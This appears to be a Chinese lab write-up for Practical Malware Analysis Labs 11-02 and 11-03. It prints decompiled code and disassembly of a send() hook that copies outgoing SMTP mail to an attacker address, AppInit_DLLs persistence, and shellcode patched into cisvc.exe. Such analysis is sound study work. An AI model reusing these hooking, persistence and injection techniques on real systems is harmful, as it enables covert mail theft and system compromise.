+<p><code>sub_1000113D</code>函数是跳板首先要去的函数。</p>
+<p><code>sub_1000113D</code>函数首先判断<code>send</code>的字符串中是否有”RCPT TO:”的字符串，即调用<code>send</code>的方法是否为一个SMTP协议的方法：</p>
+<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> ( <span class="built_in">strstr</span>(Str, SubStr) )                    <span class="comment">// RCPT TO:</span></span><br><span class="line">  &#123;</span><br><span class="line">    v4 = <span class="built_in">strlen</span>(::Str);</span><br><span class="line">    <span class="built_in">memcpy</span>(Dst, aRcptTo_1, v4);</span><br><span class="line">    v5 = <span class="built_in">strlen</span>(aRcptTo_2);</span><br><span class="line">    <span class="built_in">memcpy</span>(&amp;Dst[v5], email_address_100034A0, <span class="number">0x101</span>u);</span><br><span class="line">    <span class="built_in">strcat</span>(Dst, Source);</span><br><span class="line">    v6 = <span class="built_in">strlen</span>(Dst);</span><br><span class="line">    trampoline_10003484(a1, Dst, v6, a4);</span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure>
+
+<p>然后会向先前解密得到的地址”<a href="mailto:billy@malwareanalysisbook.com" target="_blank" rel="noopener">billy@malwareanalysisbook.com</a>“发送<code>send</code>发送的邮件。</p>
+<p>然后调用跳板指令调用正确的<code>send</code>函数：</p>
+<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">return</span> trampoline_10003484(a1, Str, a3, a4);</span><br></pre></td></tr></table></figure>
+
+<h2 id="这个恶意DLL导出了什么？"><a href="#这个恶意DLL导出了什么？" class="headerlink" title="这个恶意DLL导出了什么？"></a>这个恶意DLL导出了什么？</h2><p>导出了一个<code>installer</code>函数，用于设置注册表使得恶意代码常驻。</p>
+<h2 id="使用run32dll-exe来安装这个恶意代码之后，发生了什么？"><a href="#使用run32dll-exe来安装这个恶意代码之后，发生了什么？" class="headerlink" title="使用run32dll.exe来安装这个恶意代码之后，发生了什么？"></a>使用run32dll.exe来安装这个恶意代码之后，发生了什么？</h2><p>将自身dll复制到system32\spoolvxx32.dll，并设置注册表中的AppInit_Dlls值来保持常驻。</p>
+<h2 id="为了使这个恶意代码正确安装，Lab11-02-ini必须放置在何处？"><a href="#为了使这个恶意代码正确安装，Lab11-02-ini必须放置在何处？" class="headerlink" title="为了使这个恶意代码正确安装，Lab11-02.ini必须放置在何处？"></a>为了使这个恶意代码正确安装，Lab11-02.ini必须放置在何处？</h2><p>放在系统目录C:\WINDOWS\system32\。</p>
+<h2 id="这个安装的恶意代码如何驻留？"><a href="#这个安装的恶意代码如何驻留？" class="headerlink" title="这个安装的恶意代码如何驻留？"></a>这个安装的恶意代码如何驻留？</h2><p>注册表中的AppInit_Dlls值使得系统调用User32.dll时会加载spoolvxx32.dll来保持驻留。</p>
+<h2 id="这个恶意代码采用的用户态Rootkit技术是什么？"><a href="#这个恶意代码采用的用户态Rootkit技术是什么？" class="headerlink" title="这个恶意代码采用的用户态Rootkit技术是什么？"></a>这个恶意代码采用的用户态Rootkit技术是什么？</h2><p>使用hook技术在系统调用 wsock32.dll中的<code>send</code>函数之前插入一段指令。</p>
+<h2 id="挂钩代码做了什么？"><a href="#挂钩代码做了什么？" class="headerlink" title="挂钩代码做了什么？"></a>挂钩代码做了什么？</h2><p>会检查出系统向外发出的带有”RCPT TO:”的数据包，将数据包发送给”<a href="mailto:billy@malwareanalysisbook.com" target="_blank" rel="noopener">billy@malwareanalysisbook.com</a>“。</p>
+<h2 id="哪个或者哪些进程执行了这个恶意攻击，为什么？"><a href="#哪个或者哪些进程执行了这个恶意攻击，为什么？" class="headerlink" title="哪个或者哪些进程执行了这个恶意攻击，为什么？"></a>哪个或者哪些进程执行了这个恶意攻击，为什么？</h2><p>针对了MSIMN.exe，THEBAT.exe，OUTLOOK.exe，因为它们都是电子邮箱客户端程序。</p>
+<h2 id="ini文件的意义是什么？"><a href="#ini文件的意义是什么？" class="headerlink" title="ini文件的意义是什么？"></a>ini文件的意义是什么？</h2><p>包含了一个加密的恶意电子邮箱地址：”<a href="mailto:billy@malwareanalysisbook.com" target="_blank" rel="noopener">billy@malwareanalysisbook.com</a>“。</p>
+<h2 id="你怎样用WireShark动态抓获这个恶意代码的行为？"><a href="#你怎样用WireShark动态抓获这个恶意代码的行为？" class="headerlink" title="你怎样用WireShark动态抓获这个恶意代码的行为？"></a>你怎样用WireShark动态抓获这个恶意代码的行为？</h2><p>监听网卡后过滤出SMTP协议相关的包即可。</p>
+<h1 id="Lab11-03"><a href="#Lab11-03" class="headerlink" title="Lab11-03"></a>Lab11-03</h1><h2 id="简要分析-2"><a href="#简要分析-2" class="headerlink" title="简要分析"></a>简要分析</h2><p>Lab11-03.exe的main函数结果如下：</p>
+<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">int</span> __<span class="function">cdecl <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">const</span> <span class="keyword">char</span> **argv, <span class="keyword">const</span> <span class="keyword">char</span> **envp)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  CHAR FileName; <span class="comment">// [esp+0h] [ebp-104h]</span></span><br><span class="line"></span><br><span class="line">  CopyFileA(ExistingFileName, NewFileName, <span class="number">0</span>);</span><br><span class="line">  <span class="built_in">sprintf</span>(&amp;FileName, aCWindowsSystem_0, aCisvcExe);</span><br><span class="line">  write_shellcode_401070(&amp;FileName);</span><br><span class="line">  system(aNetStartCisvc);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>首先复制Lab11-03.dll到系统目录中：</p>
+<figure class="highlight x86asm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="symbol">.text:</span>004012<span class="built_in">DB</span>                 <span class="keyword">push</span>    offset NewFileName <span class="comment">; "C:\\WINDOWS\\System32\\inet_epar32.dll"</span></span><br><span class="line"><span class="symbol">.text:</span>004012E0                 <span class="keyword">push</span>    offset ExistingFileName <span class="comment">; "Lab11-03.dll"</span></span><br><span class="line"><span class="symbol">.text:</span>004012E5                 <span class="keyword">call</span>    <span class="built_in">ds</span>:CopyFileA</span><br></pre></td></tr></table></figure>
+
+<p>创建一个字符串”C:\WINDOWS\System32\cisvc.exe”：</p>
+<figure class="highlight x86asm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="symbol">.text:</span>004012EB                 <span class="keyword">push</span>    offset aCisvcExe <span class="comment">; "cisvc.exe"</span></span><br><span class="line"><span class="symbol">.text:</span>004012F0                 <span class="keyword">push</span>    offset aCWindowsSystem_0 <span class="comment">; "C:\\WINDOWS\\System32\\%s"</span></span><br><span class="line"><span class="symbol">.text:</span>004012F5                 <span class="keyword">lea</span>     <span class="built_in">eax</span>, [<span class="built_in">ebp</span>+FileName]</span><br><span class="line"><span class="symbol">.text:</span>004012FB                 <span class="keyword">push</span>    <span class="built_in">eax</span>             <span class="comment">; char *</span></span><br><span class="line"><span class="symbol">.text:</span>004012FC                 <span class="keyword">call</span>    _sprintf</span><br></pre></td></tr></table></figure>
+
+<p>然后是修改cisvc.exe的操作：</p>
+<figure class="highlight x86asm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="symbol">.text:</span>0040130A                 <span class="keyword">push</span>    <span class="built_in">ecx</span>             <span class="comment">; lpFileName</span></span><br><span class="line"><span class="symbol">.text:</span>0040130B                 <span class="keyword">call</span>    write_shellcode_401070</span><br></pre></td></tr></table></figure>
+
+<p><code>write_shellcode_401070</code>首先打开cisvc.exe：</p>
+<figure class="highlight x86asm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="symbol">.text:</span>0040107F                 <span class="keyword">push</span>    <span class="number">0</span>               <span class="comment">; hTemplateFile</span></span><br><span class="line"><span class="symbol">.text:</span><span class="number">00401081</span>                 <span class="keyword">push</span>    <span class="number">80h</span>             <span class="comment">; dwFlagsAndAttributes</span></span><br><span class="line"><span class="symbol">.text:</span><span class="number">00401086</span>                 <span class="keyword">push</span>    <span class="number">4</span>               <span class="comment">; dwCreationDisposition</span></span><br><span class="line"><span class="symbol">.text:</span><span class="number">00401088</span>                 <span class="keyword">push</span>    <span class="number">0</span>               <span class="comment">; lpSecurityAttributes</span></span><br><span class="line"><span class="symbol">.text:</span>0040108A                 <span class="keyword">push</span>    <span class="number">1</span>               <span class="comment">; dwShareMode</span></span><br><span class="line"><span class="symbol">.text:</span>0040108C                 <span class="keyword">push</span>    <span class="number">0C0000000h</span>      <span class="comment">; dwDesiredAccess</span></span><br><span class="line"><span class="symbol">.text:</span><span class="number">00401091</span>                 <span class="keyword">mov</span>     <span class="built_in">eax</span>, [<span class="built_in">ebp</span>+lpFileName]</span><br><span class="line"><span class="symbol">.text:</span><span class="number">00401094</span>                 <span class="keyword">push</span>    <span class="built_in">eax</span>             <span class="comment">; lpFileName</span></span><br><span class="line"><span class="symbol">.text:</span><span class="number">00401095</span>                 <span class="keyword">call</span>    <span class="built_in">ds</span>:CreateFileA</span><br><span class="line"><span class="symbol">.text:</span>0040109B                 <span class="keyword">mov</span>     [<span class="built_in">ebp</span>+hFile], <span class="built_in">eax</span></span><br><span class="line"><span class="symbol">.text:</span>0040109E                 <span class="keyword">cmp</span>     [<span class="built_in">ebp</span>+hFile], <span class="number">0FFFFFFFFh</span></span><br><span class="line"><span class="symbol">.text:</span>004010A2                 <span class="keyword">jnz</span>     short get_handle_4010AC</span><br></pre></td></tr></table></figure>
+
+<p>获取程序的句柄：</p>
+<figure class="highlight x86asm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="symbol">.text:</span>004010AC get_handle_4010AC:                      <span class="comment">; CODE XREF: write_shellcode_401070+32↑j</span></span><br><span class="line"><span class="symbol">.text:</span>004010AC                 <span class="keyword">push</span>    <span class="number">0</span>               <span class="comment">; lpFileSizeHigh</span></span><br><span class="line"><span class="symbol">.text:</span>004010AE                 <span class="keyword">mov</span>     <span class="built_in">ecx</span>, [<span class="built_in">ebp</span>+hFile]</span><br><span class="line"><span class="symbol">.text:</span>004010B1                 <span class="keyword">push</span>    <span class="built_in">ecx</span>             <span class="comment">; hFile</span></span><br><span class="line"><span class="symbol">.text:</span>004010B2                 <span class="keyword">call</span>    <span class="built_in">ds</span>:GetFileSize</span><br><span class="line"><span class="symbol">.text:</span>004010B8                 <span class="keyword">mov</span>     [<span class="built_in">ebp</span>+dwMaximumSizeLow], <span class="built_in">eax</span></span><br><span class="line"><span class="symbol">.text:</span>004010BB                 <span class="keyword">push</span>    <span class="number">0</span>               <span class="comment">; lpName</span></span><br><span class="line"><span class="symbol">.text:</span>004010BD                 <span class="keyword">mov</span>     <span class="built_in">edx</span>, [<span class="built_in">ebp</span>+dwMaximumSizeLow]</span><br><span class="line"><span class="symbol">.text:</span>004010C0                 <span class="keyword">push</span>    <span class="built_in">edx</span>             <span class="comment">; dwMaximumSizeLow</span></span><br><span class="line"><span class="symbol">.text:</span>004010C1                 <span class="keyword">push</span>    <span class="number">0</span>               <span class="comment">; dwMaximumSizeHigh</span></span><br><span class="line"><span class="symbol">.text:</span>004010C3                 <span class="keyword">push</span>    <span class="number">4</span>               <span class="comment">; flProtect</span></span><br><span class="line"><span class="symbol">.text:</span>004010C5                 <span class="keyword">push</span>    <span class="number">0</span>               <span class="comment">; lpFileMappingAttributes</span></span><br><span class="line"><span class="symbol">.text:</span>004010C7                 <span class="keyword">mov</span>     <span class="built_in">eax</span>, [<span class="built_in">ebp</span>+hFile]</span><br><span class="line"><span class="symbol">.text:</span>004010CA                 <span class="keyword">push</span>    <span class="built_in">eax</span>             <span class="comment">; hFile</span></span><br><span class="line"><span class="symbol">.text:</span>004010CB                 <span class="keyword">call</span>    <span class="built_in">ds</span>:CreateFileMappingA</span><br><span class="line"><span class="symbol">.text:</span>004010D1                 <span class="keyword">mov</span>     [<span class="built_in">ebp</span>+hFileMappingObject], <span class="built_in">eax</span></span><br><span class="line"><span class="symbol">.text:</span>004010D4                 <span class="keyword">cmp</span>     [<span class="built_in">ebp</span>+hFileMappingObject], <span class="number">0FFFFFFFFh</span></span><br><span class="line"><span class="symbol">.text:</span>004010D8                 <span class="keyword">jnz</span>     short loc_4010EC</span><br><span class="line"><span class="symbol">.text:</span>004010DA                 <span class="keyword">mov</span>     <span class="built_in">ecx</span>, [<span class="built_in">ebp</span>+hFile]</span><br><span class="line"><span class="symbol">.text:</span>004010<span class="built_in">DD</span>                 <span class="keyword">push</span>    <span class="built_in">ecx</span>             <span class="comment">; hObject</span></span><br><span class="line"><span class="symbol">.text:</span>004010DE                 <span class="keyword">call</span>    <span class="built_in">ds</span>:CloseHandle</span><br><span class="line"><span class="symbol">.text:</span>004010E4                 <span class="keyword">or</span>      <span class="built_in">eax</span>, <span class="number">0FFFFFFFFh</span></span><br><span class="line"><span class="symbol">.text:</span>004010E7                 <span class="keyword">jmp</span>     exit_4012C5</span><br></pre></td></tr></table></figure>
+
+<p>设置读写权限：</p>
+<figure class="highlight x86asm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="symbol">.text:</span>004010EC set_permission_4010EC:                  <span class="comment">; CODE XREF: write_shellcode_401070+68↑j</span></span><br><span class="line"><span class="symbol">.text:</span>004010EC                 <span class="keyword">mov</span>     <span class="built_in">edx</span>, [<span class="built_in">ebp</span>+dwMaximumSizeLow]</span><br><span class="line"><span class="symbol">.text:</span>004010EF                 <span class="keyword">push</span>    <span class="built_in">edx</span>             <span class="comment">; dwNumberOfBytesToMap</span></span><br><span class="line"><span class="symbol">.text:</span>004010F0                 <span class="keyword">push</span>    <span class="number">0</span>               <span class="comment">; dwFileOffsetLow</span></span><br><span class="line"><span class="symbol">.text:</span>004010F2                 <span class="keyword">push</span>    <span class="number">0</span>               <span class="comment">; dwFileOffsetHigh</span></span><br><span class="line"><span class="symbol">.text:</span>004010F4                 <span class="keyword">push</span>    <span class="number">6</span>               <span class="comment">; dwDesiredAccess</span></span><br><span class="line"><span class="symbol">.text:</span>004010F6                 <span class="keyword">mov</span>     <span class="built_in">eax</span>, [<span class="built_in">ebp</span>+hFileMappingObject]</span><br><span class="line"><span class="symbol">.text:</span>004010F9                 <span class="keyword">push</span>    <span class="built_in">eax</span>             <span class="comment">; hFileMappingObject</span></span><br><span class="line"><span class="symbol">.text:</span>004010FA                 <span class="keyword">call</span>    <span class="built_in">ds</span>:MapViewOfFile</span><br><span class="line"><span class="symbol">.text:</span><span class="number">00401100</span>                 <span class="keyword">mov</span>     [<span class="built_in">ebp</span>+lpBaseAddress], <span class="built_in">eax</span></span><br><span class="line"><span class="symbol">.text:</span><span class="number">00401103</span>                 <span class="keyword">cmp</span>     [<span class="built_in">ebp</span>+lpBaseAddress], <span class="number">0</span></span><br><span class="line"><span class="symbol">.text:</span><span class="number">00401107</span>                 <span class="keyword">jnz</span>     short loc_40112F</span><br><span class="line"><span class="symbol">.text:</span><span class="number">00401109</span>                 <span class="keyword">mov</span>     <span class="built_in">ecx</span>, [<span class="built_in">ebp</span>+hFile]</span><br><span class="line"><span class="symbol">.text:</span>0040110C                 <span class="keyword">push</span>    <span class="built_in">ecx</span>             <span class="comment">; hObject</span></span><br><span class="line"><span class="symbol">.text:</span><span class="number">0040110D</span>                 <span class="keyword">call</span>    <span class="built_in">ds</span>:CloseHandle</span><br><span class="line"><span class="symbol">.text:</span><span class="number">00401113</span>                 <span class="keyword">mov</span>     <span class="built_in">edx</span>, [<span class="built_in">ebp</span>+hFileMappingObject]</span><br><span class="line"><span class="symbol">.text:</span><span class="number">00401116</span>                 <span class="keyword">push</span>    <span class="built_in">edx</span>             <span class="comment">; hObject</span></span><br><span class="line"><span class="symbol">.text:</span><span class="number">00401117</span>                 <span class="keyword">call</span>    <span class="built_in">ds</span>:CloseHandle</span><br><span class="line"><span class="symbol">.text:</span><span class="number">0040111D</span>                 <span class="keyword">mov</span>     <span class="built_in">eax</span>, [<span class="built_in">ebp</span>+lpBaseAddress]</span><br><span class="line"><span class="symbol">.text:</span><span class="number">00401120</span>                 <span class="keyword">push</span>    <span class="built_in">eax</span>             <span class="comment">; lpBaseAddress</span></span><br><span class="line"><span class="symbol">.text:</span><span class="number">00401121</span>                 <span class="keyword">call</span>    <span class="built_in">ds</span>:UnmapViewOfFile</span><br><span class="line"><span class="symbol">.text:</span><span class="number">00401127</span>                 <span class="keyword">or</span>      <span class="built_in">eax</span>, <span class="number">0FFFFFFFFh</span></span><br><span class="line"><span class="symbol">.text:</span>0040112A                 <span class="keyword">jmp</span>     exit_4012C5</span><br></pre></td></tr></table></figure>
+
+<p>修改cisvc.exe：</p>
+<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> ( (v6[<span class="number">4</span>] - v6[<span class="number">2</span>]) &gt;= <span class="number">0x13A</span> )</span><br><span class="line">&#123;</span><br><span class="line">  v3 = v6[<span class="number">2</span>] + v6[<span class="number">5</span>];</span><br><span class="line">  <span class="keyword">for</span> ( i = <span class="number">0</span>; i &lt; <span class="number">314</span>; ++i )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">if</span> ( *(&amp;loc_409030 + i) == <span class="number">0x78</span></span><br><span class="line">      &amp;&amp; *(&amp;loc_409030 + i + <span class="number">1</span>) == <span class="number">0x56</span></span><br><span class="line">      &amp;&amp; *(&amp;loc_409030 + i + <span class="number">2</span>) == <span class="number">0x34</span></span><br><span class="line">      &amp;&amp; *(&amp;loc_409030 + i + <span class="number">3</span>) == <span class="number">0x12</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      *(&amp;loc_409030 + i) = v6[<span class="number">5</span>] + *(v4 + <span class="number">40</span>) - *(v4 + <span class="number">44</span>) - (v3 + i + <span class="number">4</span>);</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  qmemcpy(cisvc_addr + v3, &amp;loc_409030, <span class="number">0x13A</span>u);</span><br><span class="line">  *(v4 + <span class="number">40</span>) = *(v4 + <span class="number">44</span>) + v3 - v6[<span class="number">5</span>];</span><br><span class="line">  CloseHandle(hFile);</span><br><span class="line">  CloseHandle(hFileMappingObject);</span><br><span class="line">  UnmapViewOfFile(cisvc_addr);</span><br><span class="line">  result = <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>添加内容的起始：</p>
+<figure class="highlight x86asm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line"><span class="symbol">.data:</span><span class="number">00409030</span> loc_409030:                             <span class="comment">; DATA XREF: write_shellcode_401070+19D↑r</span></span><br><span class="line"><span class="symbol">.data:</span><span class="number">00409030</span>                                         <span class="comment">; write_shellcode_401070+1FF↑w ...</span></span><br><span class="line"><span class="symbol">.data:</span><span class="number">00409030</span>                 <span class="keyword">push</span>    <span class="built_in">ebp</span></span><br><span class="line"><span class="symbol">.data:</span><span class="number">00409031</span>                 <span class="keyword">mov</span>     <span class="built_in">ebp</span>, <span class="built_in">esp</span>        <span class="comment">; DATA XREF: write_shellcode_401070+1AD↑r</span></span><br><span class="line"><span class="symbol">.data:</span><span class="number">00409031</span>                                         <span class="comment">; write_shellcode_401070+1BD↑r</span></span><br><span class="line"><span class="symbol">.data:</span><span class="number">00409033</span>                 <span class="keyword">sub</span>     <span class="built_in">esp</span>, <span class="number">40h</span>        <span class="comment">; DATA XREF: write_shellcode_401070+1CD↑r</span></span><br><span class="line"><span class="symbol">.data:</span><span class="number">00409039</span>                 <span class="keyword">jmp</span>     loc_409134</span><br><span class="line"><span class="symbol">.data:</span><span class="number">00409134</span> loc_409134:                             <span class="comment">; CODE XREF: .data:00409039↑j</span></span><br><span class="line"><span class="symbol">.data:</span><span class="number">00409134</span>                 <span class="keyword">call</span>    sub_4090DD</span><br><span class="line"><span class="symbol">                              .data:</span>004090<span class="built_in">DD</span> sub_4090DD      proc <span class="built_in">near</span>               <span class="comment">; CODE XREF: .data:loc_409134↓p</span></span><br><span class="line"><span class="symbol">                              .data:</span>004090<span class="built_in">DD</span>                 <span class="keyword">pop</span>     <span class="built_in">ebx</span></span><br><span class="line"><span class="symbol">                              .data:</span>004090DE                 <span class="keyword">call</span>    sub_4090BC</span><br><span class="line"><span class="symbol">                              .data:</span>004090E3                 <span class="keyword">mov</span>     <span class="built_in">edx</span>, <span class="built_in">eax</span></span><br><span class="line"><span class="symbol">                              .data:</span>004090E5                 <span class="keyword">push</span>    <span class="number">753A4FCh</span></span><br><span class="line"><span class="symbol">                              .data:</span>004090EA                 <span class="keyword">push</span>    <span class="built_in">edx</span></span><br><span class="line"><span class="symbol">                              .data:</span>004090EB                 <span class="keyword">call</span>    sub_40905F</span><br><span class="line"><span class="symbol">                              .data:</span>004090F0                 <span class="keyword">mov</span>     [<span class="built_in">ebp</span>-<span class="number">4</span>], <span class="built_in">eax</span></span><br><span class="line"><span class="symbol">                              .data:</span>004090F3                 <span class="keyword">push</span>    <span class="number">7C0DFCAAh</span></span><br><span class="line"><span class="symbol">                              .data:</span>004090F8                 <span class="keyword">push</span>    <span class="built_in">edx</span></span><br><span class="line"><span class="symbol">                              .data:</span>004090F9                 <span class="keyword">call</span>    sub_40905F</span><br><span class="line"><span class="symbol">                              .data:</span>004090FE                 <span class="keyword">mov</span>     [<span class="built_in">ebp</span>-<span class="number">0Ch</span>], <span class="built_in">eax</span></span><br><span class="line"><span class="symbol">                              .data:</span><span class="number">00409101</span>                 <span class="keyword">lea</span>     <span class="built_in">eax</span>, [<span class="built_in">ebx</span>+<span class="number">0</span>]</span><br><span class="line"><span class="symbol">                              .data:</span><span class="number">00409107</span>                 <span class="keyword">push</span>    <span class="number">0</span></span><br><span class="line"><span class="symbol">                              .data:</span>0040910C                 <span class="keyword">push</span>    <span class="number">0</span></span><br><span class="line"><span class="symbol">                              .data:</span><span class="number">00409111</span>                 <span class="keyword">push</span>    <span class="built_in">eax</span></span><br><span class="line"><span class="symbol">                              .data:</span><span class="number">00409112</span>                 <span class="keyword">call</span>    <span class="built_in">dword</span> <span class="built_in">ptr</span> [<span class="built_in">ebp</span>-<span class="number">4</span>]</span><br><span class="line"><span class="symbol">                              .data:</span><span class="number">00409115</span>                 <span class="keyword">mov</span>     [<span class="built_in">ebp</span>-<span class="number">10h</span>], <span class="built_in">eax</span></span><br><span class="line"><span class="symbol">                              .data:</span><span class="number">00409118</span>                 <span class="keyword">lea</span>     <span class="built_in">eax</span>, [<span class="built_in">ebx</span>+<span class="number">24h</span>]</span><br><span class="line"><span class="symbol">                              .data:</span>0040911E                 <span class="keyword">push</span>    <span class="built_in">eax</span></span><br><span class="line"><span class="symbol">                              .data:</span>0040911F                 <span class="keyword">mov</span>     <span class="built_in">eax</span>, [<span class="built_in">ebp</span>-<span class="number">10h</span>]</span><br><span class="line"><span class="symbol">                              .data:</span><span class="number">00409122</span>                 <span class="keyword">push</span>    <span class="built_in">eax</span></span><br><span class="line"><span class="symbol">                              .data:</span><span class="number">00409123</span>                 <span class="keyword">call</span>    <span class="built_in">dword</span> <span class="built_in">ptr</span> [<span class="built_in">ebp</span>-<span class="number">0Ch</span>]</span><br><span class="line"><span class="symbol">                              .data:</span><span class="number">00409126</span>                 <span class="keyword">mov</span>     [<span class="built_in">ebp</span>-<span class="number">8</span>], <span class="built_in">eax</span></span><br><span class="line"><span class="symbol">                              .data:</span><span class="number">00409129</span>                 <span class="keyword">call</span>    <span class="built_in">dword</span> <span class="built_in">ptr</span> [<span class="built_in">ebp</span>-<span class="number">8</span>]</span><br><span class="line"><span class="symbol">                              .data:</span>0040912C                 <span class="keyword">mov</span>     <span class="built_in">esp</span>, <span class="built_in">ebp</span></span><br><span class="line"><span class="symbol">                              .data:</span>0040912E                 <span class="keyword">pop</span>     <span class="built_in">ebp</span></span><br><span class="line"><span class="symbol">                              .data:</span>0040912F                 <span class="keyword">jmp</span>     <span class="built_in">near</span> <span class="built_in">ptr</span> <span class="number">1274E7ACh</span></span><br><span class="line"><span class="symbol">                              .data:</span>0040912F sub_4090DD      endp</span><br></pre></td></tr></table></figure>
+
+<p>修改后的cisvc.exe的首先会调用一个函数：</p>
+<figure class="highlight x86asm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="symbol">.text:</span>01001AF9 <span class="number">8D</span> <span class="number">83</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span>                       <span class="keyword">lea</span>     <span class="built_in">eax</span>, [<span class="built_in">ebx</span>+<span class="number">0</span>]</span><br><span class="line"><span class="symbol">.text:</span>01001AFF <span class="number">68</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span>                          <span class="keyword">push</span>    <span class="number">0</span></span><br><span class="line"><span class="symbol">.text:</span>01001B04 <span class="number">68</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span>                          <span class="keyword">push</span>    <span class="number">0</span></span><br><span class="line"><span class="symbol">.text:</span>01001B09 <span class="number">50</span>                                      <span class="keyword">push</span>    <span class="built_in">eax</span></span><br><span class="line"><span class="symbol">.text:</span>01001B0A FF <span class="number">55</span> FC                                <span class="keyword">call</span>    <span class="built_in">dword</span> <span class="built_in">ptr</span> [<span class="built_in">ebp</span>-<span class="number">4</span>]</span><br></pre></td></tr></table></figure>
+
+<p>动态调试下：</p>
